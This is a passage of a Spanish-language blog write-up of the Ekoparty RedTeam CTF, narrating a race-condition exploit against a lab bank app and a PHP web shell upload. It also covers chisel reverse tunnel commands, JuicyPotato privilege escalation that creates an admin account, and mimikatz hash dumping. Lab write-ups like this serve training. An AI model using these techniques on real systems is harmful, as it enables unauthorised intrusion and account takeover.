+<pre class="chroma"><code class="language-fallback" data-lang="fallback">./chisel server -p 8000 --reverse
+</code></pre></td></tr></table>
+</div>
+</div><p>En la máquina objetivo con los siguientes parametros:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">./chisel client ip:8000 R:9001:10.0.0.228:443
+</code></pre></td></tr></table>
+</div>
+</div><p>Cuando el cliente se conecta, se abre el puerto 9001 en nuestra máquina y podemos mediante chisel redirigir todo el tráfico que mandemos por el puerto 9001 a la ip interna 10.0.228 puerto 443. Si quieren obtener más info de cómo usar chisel pueden ir al siguiente <a href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html" target="_blank" rel="noopener noreffer">enlace</a></p>
+<p>Lamentablemente, me olvide de sacar un screenshot de la página principal, pero podíamos ver que se trataba de una aplicación web escrita en PHP y se nos presentaba un formulario para crear un usuario con su respectiva contraseña y loguearnos. Una vez logueados, se nos presenta la siguiente página:
+<figure><a class="lightgallery" href="/images/redteam-ctf-writeup/bank1.png" title="Bank" data-thumbnail="/images/redteam-ctf-writeup/bank1.png" data-sub-html="<h2>Bank</h2><p>Bank</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading/normal.min.svg"
+            data-src="/images/redteam-ctf-writeup/bank1.png"
+            data-srcset="/images/redteam-ctf-writeup/bank1.png, /images/redteam-ctf-writeup/bank1.png 1.5x, /images/redteam-ctf-writeup/bank1.png 2x"
+            data-sizes="auto"
+            alt="Bank" />
+    </a><figcaption class="image-caption">Bank</figcaption>
+    </figure></p>
+<p>Y en la sección &ldquo;profile&rdquo; lo siguiente:
+<figure><a class="lightgallery" href="/images/redteam-ctf-writeup/bank3.png" title="Bank profile" data-thumbnail="/images/redteam-ctf-writeup/bank3.png" data-sub-html="<h2>Mas duro que gato de yeso</h2><p>Bank profile</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading/normal.min.svg"
+            data-src="/images/redteam-ctf-writeup/bank3.png"
+            data-srcset="/images/redteam-ctf-writeup/bank3.png, /images/redteam-ctf-writeup/bank3.png 1.5x, /images/redteam-ctf-writeup/bank3.png 2x"
+            data-sizes="auto"
+            alt="Bank profile" />
+    </a><figcaption class="image-caption">Mas duro que gato de yeso</figcaption>
+    </figure></p>
+<p>Si tenemos más de 2000 pe en nuestra cuenta, se permite cambiar nuestra foto de perfil, enseguida podemos inferir que si logramos subir un archivo PHP obtendremos ejecucion de código. Pero, ¿cómo?</p>
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube-nocookie.com/embed/8de2W3rtZsA" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+<p>En reto se llama &ldquo;Race against the machine&rdquo; y se nos indica que la página de PucaraSec puede tener información sobre esto. En su <a href="https://blog.pucarasec.com/2020/07/06/web-application-race-conditions-its-not-just-for-binaries/" target="_blank" rel="noopener noreffer">blog</a> encontramos un excelente artículo sobre los errores conocidos como &ldquo;race conditions&rdquo;, que no solo se encuentran en los binarios y también pueden suceder en las aplicaciones WEB. Recomendada lectura; no tiene desperdicio.</p>
+<p>Después de leer el post, tuvimos pie para abusar de un &ldquo;race condition&rdquo; en la página del Banco de Mandinga Corp.</p>
+<p>En el post para aprovechar la vulnerabilidad se utiliza BurpSuite. Para hacer uso del multithreading en Burpsuite tenés que tener la version paga. Lametablemnte no la tenemos, pero siempre está nuestro amigo OWASP ZAP para los pobres.</p>
+<p>Ponemos a correr OWASP ZAP, hacemos un request y lo modificamos para agregarle el Header &ldquo;Count&rdquo;</p>
+<p><figure><a class="lightgallery" href="/images/redteam-ctf-writeup/bank6.png" title="ZAP" data-thumbnail="/images/redteam-ctf-writeup/bank6.png" data-sub-html="<h2>OWASP ZAP</h2><p>ZAP</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading/normal.min.svg"
+            data-src="/images/redteam-ctf-writeup/bank6.png"
+            data-srcset="/images/redteam-ctf-writeup/bank6.png, /images/redteam-ctf-writeup/bank6.png 1.5x, /images/redteam-ctf-writeup/bank6.png 2x"
+            data-sizes="auto"
+            alt="ZAP" />
+    </a><figcaption class="image-caption">OWASP ZAP</figcaption>
+    </figure></p>
+<p>Luego agarramos nuestra petición modificada y la mandamos a &ldquo;Fuzzer&rdquo;, agregamos el &ldquo;1&rdquo; en nuestro header Count y configuramos para que realice 100 peticiones.
+<figure><a class="lightgallery" href="/images/redteam-ctf-writeup/bank7.png" title="ZAP Fuzzer" data-thumbnail="/images/redteam-ctf-writeup/bank7.png" data-sub-html="<h2>ZAP Fuzzing</h2><p>ZAP Fuzzer</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading/normal.min.svg"
+            data-src="/images/redteam-ctf-writeup/bank7.png"
+            data-srcset="/images/redteam-ctf-writeup/bank7.png, /images/redteam-ctf-writeup/bank7.png 1.5x, /images/redteam-ctf-writeup/bank7.png 2x"
+            data-sizes="auto"
+            alt="ZAP Fuzzer" />
+    </a><figcaption class="image-caption">ZAP Fuzzing</figcaption>
+    </figure>
+En la pestaña &ldquo;options&rdquo; seleccionamos que use 50 threads concurrentes y de esta manera lograr el cometido.
+<figure><a class="lightgallery" href="/images/redteam-ctf-writeup/bank8.png" title="ZAP Fuzzer" data-thumbnail="/images/redteam-ctf-writeup/bank8.png" data-sub-html="<h2>ZAP Fuzzing 2</h2><p>ZAP Fuzzer</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading/normal.min.svg"
+            data-src="/images/redteam-ctf-writeup/bank8.png"
+            data-srcset="/images/redteam-ctf-writeup/bank8.png, /images/redteam-ctf-writeup/bank8.png 1.5x, /images/redteam-ctf-writeup/bank8.png 2x"
+            data-sizes="auto"
+            alt="ZAP Fuzzer" />
+    </a><figcaption class="image-caption">ZAP Fuzzing 2</figcaption>
+    </figure></p>
+<p>Nuevamente recomiendo leer el <a href="https://blog.pucarasec.com/2020/07/06/web-application-race-conditions-its-not-just-for-binaries/" target="_blank" rel="noopener noreffer">blog</a> de PucaraSec para entender mejor porqué esto funciona.</p>
+<p>Voila! ¡Una vez lanzado nuestro &ldquo;fuzzer&rdquo; logramos nuestro cometido!
+<figure><a class="lightgallery" href="/images/redteam-ctf-writeup/bank.png" title="Exploit Banco" data-thumbnail="/images/redteam-ctf-writeup/bank.png" data-sub-html="<h2>Funcionara en mi banco(?</h2><p>Exploit Banco</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading/normal.min.svg"
+            data-src="/images/redteam-ctf-writeup/bank.png"
+            data-srcset="/images/redteam-ctf-writeup/bank.png, /images/redteam-ctf-writeup/bank.png 1.5x, /images/redteam-ctf-writeup/bank.png 2x"
+            data-sizes="auto"
+            alt="Exploit Banco" />
+    </a><figcaption class="image-caption">Funcionara en mi banco(?</figcaption>
+    </figure></p>
+<p>Volvemos a la seccion &ldquo;Profile&rdquo; y nos permite subir una imagen, nosotros aprovechamos al no haber restricciones en lo que se sube y subimos una web shell en php en este caso <a href="https://github.com/flozz/p0wny-shell" target="_blank" rel="noopener noreffer">p0wny shell.</a></p>
+<p><figure><a class="lightgallery" href="/images/redteam-ctf-writeup/shellbank.png" title="Shell banco" data-thumbnail="/images/redteam-ctf-writeup/shellbank.png" data-sub-html="<h2>Otra shell que felicidad!</h2><p>Shell banco</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading/normal.min.svg"
+            data-src="/images/redteam-ctf-writeup/shellbank.png"
+            data-srcset="/images/redteam-ctf-writeup/shellbank.png, /images/redteam-ctf-writeup/shellbank.png 1.5x, /images/redteam-ctf-writeup/shellbank.png 2x"
+            data-sizes="auto"
+            alt="Shell banco" />
+    </a><figcaption class="image-caption">Otra shell que felicidad!</figcaption>
+    </figure></p>
+<p>El flag se encuentra en el &ldquo;root&rdquo; del disco C:\</p>
+<h2 id="4to-challenge">4to Challenge</h2>
+<p><figure><a class="lightgallery" href="/images/redteam-ctf-writeup/challenge4.png" title="4to Challenge" data-thumbnail="/images/redteam-ctf-writeup/challenge4.png" data-sub-html="<h2>4 To Challenge</h2><p>4to Challenge</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading/normal.min.svg"
+            data-src="/images/redteam-ctf-writeup/challenge4.png"
+            data-srcset="/images/redteam-ctf-writeup/challenge4.png, /images/redteam-ctf-writeup/challenge4.png 1.5x, /images/redteam-ctf-writeup/challenge4.png 2x"
+            data-sizes="auto"
+            alt="4to Challenge" />
+    </a><figcaption class="image-caption">4 To Challenge</figcaption>
+    </figure></p>
+<p>Luego de una enumeración manual vimos que existe una carpeta C:\Nuclear_codes para la que no tenemos permisos de lectura. La cuenta es de servicio de Windows y se llama &ldquo;xampp&rdquo;. Necesitamos ser SYSTEM! La parte de elevación de privilegios suele ser otra parte bastante frustante, hay que prestar mucha atención al detalle, después de curtirme con varias máquinas del OSCP y HackTheBox aprendí que muchas veces la respuesta está a un simple comando o en el home del usuario del que tenemos privilegios.
+Corrimos el comando &ldquo;whoami /priv&rdquo; y nos dio como resultado que el privilegio &ldquo;SeImpersonatePrivilege&rdquo; está habilitado. Vamos a utilizar la herramienta Juicipotato para poder elevar nuestros privilegios.
+En el día viernes en el espacio RedTeam se dio un workshop sobre &ldquo;Elevación de privilegios en Windows&rdquo; y se mencionó al abuso de <a href="https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/" target="_blank" rel="noopener noreffer">&ldquo;Token Privileges&rdquo;</a> y el uso de Juicypotato.</p>
+<p>Subimos el binario de JuicyPotato a la máquina mediante la sección &ldquo;Profile&rdquo; de la página.</p>
+<p>Preparamos un &ldquo;payload&rdquo;, se trata de un archivo &ldquo;bat&rdquo; con una secuencia de comandos para crear un usuario Administrador, nos percatamos que esta manera era la más &ldquo;simple&rdquo;, si hacíamos una shell inversa y por algun motivo se caía, había que volver a comenzar el proceso con Juicypotato. Otra contra de realizar una shell inversa era que no se tenía acceso a Internet, así que habría que hacer la conexión a la primer máquina que obtuvimos una shell, como en una enumeración a los puertos del host 10.0.0.228 nos dimos cuenta que el puerto 3389 estaba abierto, nos pareció lo más simple crear una cuenta de Administrador y conectarnos por RDP, pivotendo mediante nuestro primer host controlado.</p>
+<p><figure><a class="lightgallery" href="/images/redteam-ctf-writeup/privshell.png" title="Payloadpriv" data-thumbnail="/images/redteam-ctf-writeup/privshell.png" data-sub-html="<h2>Creamos el payload</h2><p>Payloadpriv</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading/normal.min.svg"
+            data-src="/images/redteam-ctf-writeup/privshell.png"
+            data-srcset="/images/redteam-ctf-writeup/privshell.png, /images/redteam-ctf-writeup/privshell.png 1.5x, /images/redteam-ctf-writeup/privshell.png 2x"
+            data-sizes="auto"
+            alt="Payloadpriv" />
+    </a><figcaption class="image-caption">Creamos el payload</figcaption>
+    </figure></p>
+<p><figure><a class="lightgallery" href="/images/redteam-ctf-writeup/privshellok.png" title="PrivEscSuccess" data-thumbnail="/images/redteam-ctf-writeup/privshellok.png" data-sub-html="<h2>Ejecutamos el script</h2><p>PrivEscSuccess</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading/normal.min.svg"
+            data-src="/images/redteam-ctf-writeup/privshellok.png"
+            data-srcset="/images/redteam-ctf-writeup/privshellok.png, /images/redteam-ctf-writeup/privshellok.png 1.5x, /images/redteam-ctf-writeup/privshellok.png 2x"
+            data-sizes="auto"
+            alt="PrivEscSuccess" />
+    </a><figcaption class="image-caption">Ejecutamos el script</figcaption>
+    </figure></p>
+<p>Vemos que la cuenta &ldquo;vamoss&rdquo; se creo correctamente!</p>
+<p>Apartir de acá pudimos leer el flag y el contenido del archivo en Nuclear_codes con el siguiente contenido:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">10.0.0.134
+
+donaldtrump:peluquin!!
+
+PUCARA{VVEFQNMBGXELEYVHARDMUZZAGIWFCQKN}
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="5to-challenge">5to Challenge</h2>
+<p><figure><a class="lightgallery" href="/images/redteam-ctf-writeup/challenge5.png" title="PrivEscSuccess" data-thumbnail="/images/redteam-ctf-writeup/challenge5.png" data-sub-html="<h2>Ejecutamos el script</h2><p>PrivEscSuccess</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading/normal.min.svg"
+            data-src="/images/redteam-ctf-writeup/challenge5.png"
+            data-srcset="/images/redteam-ctf-writeup/challenge5.png, /images/redteam-ctf-writeup/challenge5.png 1.5x, /images/redteam-ctf-writeup/challenge5.png 2x"
+            data-sizes="auto"
+            alt="PrivEscSuccess" />
+    </a><figcaption class="image-caption">Ejecutamos el script</figcaption>
+    </figure></p>
+<p>Hasta acá llegamos, solucionamos el 4to challenge en la tarde noche del viernes y no pudimos avanzar más. Nos dedicamos a enumerar los hosts que conocíamos hasta el momento, como se nos indica en el archivo con el flag del 4to challenge, se nos da una IP, esa ip pertenecia a una pc unida al dominio mandingacorp.xyz, para ser más exactos en la enumeración encontramos beta.mandingacorp.xyz(10.0.0.134), alpha.mandingacorp.xyz, gamma.mandingacorp.xyz y el controlador de dominio dc01.mandingacorp.xyz(10.0.0.195), hasta donde pudimos ver algunos hosts tenían el puerto 80 corriendo IIS, y todas SMB y RDP. Intentamos hasta con vulnerabilidades a esos hosts sin exito, eternalblue y zerologon en el DC. Lamentablemte no pudimos seguir, se ve que tadavía quedaba mucha más diversion por delante. memoryempty se dedicó a escanear la red y los hosts con nmap y proxychains mediante chisel, probamos &ldquo;donaldtrump:peluquin!!&rdquo; como usuario y contraseña en todo aquello que requería un login, sin exito. Dumpeamos los hashes de los los hosts controlados con mimkatz y los probamos contra los hosts conocidos y nada. Para el día sábado ya estabamos exhaustos, pero muy contentos con lo que logramos.</p>
+<h2 id="final">Final</h2>
+<p>Estamos muy orgullosos de haber conseguido el primer lugar en este CTF, no tenemos más que palabras de agredicimiento para la gente de PucaraSec que estuvo día y noche contestando preguntas en Discord y revisando que todo funcione correctamente. Supieron armar muy bien un CTF que resultó divertido y a la vez con cierto grado de &ldquo;realismo&rdquo;, en lo que a operaciones de RedTeam se referiere. También muy buen trabajo los y las organizadores y speakers del espacio RedTeam en la Ekoparty, ¡contenido de primerísima calidad! ¡Esperamos ansiosos el proximo encuentro!</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Actualizado el 09-28-2020</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Compartir en Blogger" data-sharer="blogger" data-url="https://bhf.com.ar/redteam-ctf-writeup/" data-title="WriteUp Redteam CTF EKOPARTY" data-description=""><i class="fab fa-blogger fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/writeup/">writeup</a>,&nbsp;<a href="/tags/redteam/">redteam</a>,&nbsp;<a href="/tags/ekoparty/">ekoparty</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Regresar</a></span>&nbsp;|&nbsp;<span><a href="/">Inicio</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/cloud-crackin-hashcat/" class="prev" rel="prev" title="Crackeando contraseñas en la &#39;Nube&#39; y GRATIS!"><i class="fas fa-angle-left fa-fw"></i>Crackeando contraseñas en la &#39;Nube&#39; y GRATIS!</a>
+            <a href="/stego-onapsis-writeup/" class="next" rel="next" title="WriteUp CTF Stego de Onapsis - EKOPARTY">WriteUp CTF Stego de Onapsis - EKOPARTY<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Provisto por <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.74.3">Hugo</a> | Tema - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.9"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">xxxx</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Volver arriba">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="Ver comentarios">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.1.3/dist/css/lightgallery.min.css"><style>.lg-toolbar .lg-icon::after { color: #999; }</style><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.8/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.es.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.0/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.1.3/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.1.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.0.1/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@7.0.4/dist/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copiar al portapapeles","maxShownLines":10},"comment":{},"data":{"id-1":"# /home/BHF","id-2":"# /home/BHF"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"es","maxResultLength":10,"noResultsFound":"No se encontraron resultados","snippetLength":30,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
